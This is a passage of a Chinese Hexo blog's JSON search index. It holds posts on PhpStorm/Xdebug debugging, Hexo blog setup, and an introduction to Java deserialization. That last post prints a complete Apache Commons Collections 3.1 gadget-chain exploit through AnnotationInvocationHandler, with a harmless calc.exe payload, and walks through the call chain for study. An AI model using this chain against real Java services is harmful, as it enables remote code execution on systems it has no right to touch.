img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstorm进行PHP断点调试","slug":"phpstorm进行PHP断点调试","date":"2020-08-20T07:19:41.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/08/20/phpstorm进行PHP断点调试/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"配置环境 phpstromphpstudy","text":"配置环境 phpstromphpstudy phpstrom 配置 php 环境 PHP安装xdebug扩展 注意版本：此时我们 php 的版本为 php5.6.9xdebug模块https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll 把下载成功的 php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll放在 E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext 文件夹下 同时在 php.ini 中添加如下配置 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;指定Xdebug扩展文件的绝对路径xdebug.auto_trace=on ;启用代码自动跟踪xdebug.collect_params=on ;允许收集传递给函数的参数变量xdebug.collect_return=on ;允许收集函数调用的返回值xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定堆栈跟踪文件的存放目录xdebug.profiler_enable=on ;是否启用Xdebug的性能分析，并创建性能信息文件xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定性能分析信息文件的输出目录xdebug.remote_enable = on ;是否开启远程调试xdebug.remote_handler = dbgp ;指定远程调试的处理协议xdebug.remote_host= localhost ;指定远程调试的主机名xdebug.remote_port = 9000 ;指定远程调试的端口号xdebug.idekey = PHPSTORM ;指定传递给DBGp调试器处理程序的IDE Key PHPStrom 配置 debug 环境 配置 Debug 端口 配置IDEKEY 配置Server 配置PHP Web Application 浏览器的xdebug插件 测试调试 加上断点，同时把小电话设置成为绿色的浏览器上的插件打开，同时访问要调试的页面 调试单个文件 调试单个文件时 配置PHP Web Application点击绿色的小虫子就可以进行调试了 就可以进行愉快的调式了！ 在进行调试时，经常遇到这个问题,xdebug断掉调试经常无故断开 如果针对某一个项目可以对项目的配置文件 vhosts.conf 中添加 12IPCConnectTimeout 3000IPCCommTimeout 3000 要对所有项目都进行配置时，可以修改httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"初识Java 反序列化","slug":"初识Java反序列化","date":"2020-08-16T13:31:50.000Z","updated":"2020-10-12T06:10:55.190Z","comments":true,"path":"2020/08/16/初识Java反序列化/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。","text":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。 Why 为什么要用序列化与反序列化 实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上。 利用序列化实现远程通信，即在网络上传送对象的字节序列。 How 如何实现序列化与反序列化 JDK类库中序列化API 使用到JDK中关键类 ObjectOutputStream(对象输出流) 和ObjectInputStream(对象输入流) ObjectOutputStream 类中：通过使用 writeObject(Object object) 方法，将对象以二进制格式进行写入。 ObjectInputStream 类中：通过使用 readObject（）方法，从输入流中读取二进制流，转换成对象。 序列化一个对象 被序列化的类必须要实现 Serializable 接口，否则将无法序列化对象。 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} 序列化对象时使用对象输出流”ObjectOutputStream”，往指定输出流里写入 User 对象，使用控制台，可以直观的看到对象序列化后的样子。 �� \u0005sr Simple.User��Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet 反序列化对象 将对象序列化成byte数组。再用”ObjectInputStream”反序列化回来。 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //将byte数组输入流反序列化 System.out.println(o); }} 输出这个反序列化后的对象，和一开始为 User 对象设定的属性值完全相同。同时Java为我们提供了自定义writeObject()、readObject()方法的功能，我们在目标类中自定义writeObject()、readObject()方法之后，将会首先调用我们自定义的方法，然后在继续执行原有的方法步骤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User 类写一个 readObject 方法上去，当对象被反序列化的时候，该方法就会被调用。 序列化时仅能序列化对象的属性，并不能控制方法中的reObject的代码，所有漏洞的构造需要引入新的jar包 commons-collections-3.1反序列化漏洞 漏洞利用 利用maven 安装依赖 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} 漏洞分析 java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 最终遍历了”outerMap”这个Map对象的 Entry 集合，然后执行了 Entry 对象的的 setValue 方法导致执行了反射链。所以先查看 outerMap 的实现类 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 调用了方法org.apache.commons.collections.map.TransformedMap#decorate这个静态方法又去new了一个TransformedMap对象。map传入的是一个普通的数据，valueTransformer则是构造的调用链。org.apache.commons.collections.map.TransformedMap#TransformedMap实例化对象成功后依次调用了四个方法 entrySet() iterator() next() setValue() 在类 TransformedMap中未找到定义的 entrySet()方法，在他的父类AbstractInputCheckedMapDecorator 中找org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew 了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySet类中的iterator方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIterator类中的next方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#next又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntry类中的setValue方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue第一行调用了checkSetValue方法，此处的parent来自所以实际上调用为 org.apache.commons.collections.map.TransformedMap#checkSetValue调用了valueTransformer 的transform方法所以首先调用了org.apache.commons.collections.functors.ChainedTransformer#transform循环调用数组每一个对象的transform方法，并传入object对象，再将执行结果赋值给object对象[0]是ConstantTransformer对象，它会返回new时候的参数中的Object对象，这里也是就是”java.Runtime”[1]-[3]是InvokerTransformer对象，调用的是反射的代码 iTransformers的值是在初始化构建ChainedTransformer时生成org.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformer类中实现transform方法org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformer类中实现了transform方法org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (“getMethod”, new Class[] {String.class, Class[].class }, new Object[] {“getRuntime”, new Class[0] })iMethodName = “getMethod”;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {“getRuntime”, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} 第一个参数”getMethod”是这个函数的名字 第二个参数new Class[]{String.class, Class[].class}是getMethod的2个参数参数类型，一个是String，一个是class[] 第三个参数new Object[]{“getRuntime”, new Class[0]}是getMethod的2个参数值，一个是getRuntime，一个是空，因为是数组形式所以要这么写 getMethod(&lt;String&gt; “getRuntime”, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;“”calc.exe””) 就是通过反射去调用Runtime.getRuntime().exec(“calc.exe”) Java反射机制 java中执行系统命令的方法为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} 正常的执行步骤为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } 相对应的反射代码为 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。该方法的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。 getMethod(方法名, 方法类型)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);等价于Object runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(“Speak”, null);获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null person.getClass().getMethod(“run”, String.class);获得person对象的run方法，因为run方法的形参是String类型的，所以parameterTypes为String.class Method Class.invoke(Object obj, Object… args)invoke(某个对象实例， 传入参数) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");等价于 runtime.exec(\"calc\");调用生成的runtime实例的exec方法，并将”clac”参数传入exec()方法 实际利用 对象是可以被反序列化，但并不在反序列化时触发调用链，而是要经过迭代器迭代并且使用 setValue() 方法才行，正常情况下基本不会有这种场景。 sun.reflect.annotation.AnnotationInvocationHandler该类中重写了readObject方法,在被调用时会执行setValue操作, 如果能把TransformedMap装入这个AnnotationInvocationHandler类就可以实现任意代码执行 利用代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 sun.reflect.annotation.AnnotationInvocationHandler#readObject 传入的第一个参数 var1 必须为继承Annotation的子类，Annotation这个接口是所有注解类型的公用接口，所有注解类型都实现了这个接口。 java.lang.annotation.Retention.class java.lang.annotation.Target.class 否则在这个地方就return，不会继续向下执行了 传入的第二个参数 var2 则是构造的调用链同时map的键值必须为\"value\"，否则利用不成功，这是一处小细节~ Java 反序列化漏洞始末（1）— Apache Commons浅显易懂的JAVA反序列化入门手把手教你写JAVA反序列化的POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexo搭建个人博客","slug":"Hexo搭建个人博客","date":"2020-08-15T15:54:00.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/08/15/Hexo搭建个人博客/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js GitNode.js","text":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js GitNode.js 安装 Hexo Git 和 Node.js 安装好之后，首先创建一个用于存放博客文件的文件夹，进入文件夹后，安装并使用 Hexo 。 12$ npm install -g hexo-cli$ hexo init 安装完成之后，文件夹的目录如下： |——node_modules|——public|——scaffolds|——source|——themes|——_config.yml|——.gitignore|——db.json|——package.json|——package-lock.json 生成静态博客文件 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/ 将博客部署到 Github 上 创建仓库 创建一个名为你用户名.github.io的仓库，(必须是用户名，其他名称无效),以后的访问地址就是 http://用户名.github.io 配置 SSH 密钥 查看本机是否存在 .ssh 目录 1$ cd ~/.ssh 如果不存在，则创建一对新的 SSH 密钥 123$ssh-keygen -t rsa -C \"your_email@example.com\" # 这将按照你提供的邮箱地址，创建一对密钥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] 根据提示到输入密码和确认密码 12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] 生成 SSH 之后 运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中： 1clip &lt; ~/.ssh/id_rsa.pub 粘贴公钥到 github –&gt; Settings –&gt; SSH keys 进行测试，看是否设置成功 1$ ssh -T git@github.com 设置用户信息 Git 会根据用户的名字和邮箱来记录提交，GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替。 123$ git config --global user.name \"Whippet\" #用户名$ git config --global user.email \"Whippet0@qq.com\" #邮箱$ git config --list #查看用户信息 本地的 Hexo 文件 更新到 Github 登陆 Github 找到地址https://github.com/Whippet0/Whippet0.github.io.git 复制至 hexo 安装目录下的 _config.yml 文件中 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master 在 hexo 文件夹下执行 1234$ hexo g$ hexo d或者$ hexo g -d 如果 hexo d 的时候报错 ERROR Deployer not found: git执行 npm install hexo-deployer-git --save 然后需要输入 github 的账号和密码 成功之后访问 https://whippet0.github.io/ 美化博客 进入 hexo 主题官网挑选我们喜欢的主题，复制主题的地址https://github.com/Molunerfinn/hexo-theme-melody打开Hexo文件夹 按照 github 上的提示进行操作 若没有提示则直接 git clone 该文件夹。下载完成后，打开Hexo文件夹下的配置文件_config.yml 修改参数为：theme: melody 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/在本地进行查看 部署主题到github 上 12hexo clean (必须要，不然有时因为缓存问题，服务器更新不了主题)hexo g -d 最后我选择了这个主题 stun 因为有配套的中文说明，所以配置起来很方便。 同时也可以让博客上添加一些 Emoji 👴 发布文章 图片配置 在根目录下配置文件_config.yml 中 post_asset_folder: true安装插件 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save 利用 hexo n \"文章名称\" 在 source\\_posts下生成一个新的文章时，同时也会生成一个文章名称的文件夹，把图片放在文章名称文件夹下，在 markdown 中利用图片时是需要加上文件夹的目录，但是上传至 github 时 并不需要文件夹的目录。然后就利用 Oah 的脚本，轻松解决了这个问题。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2020-10-12T06:10:55.188Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word 😄 😄 😄 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}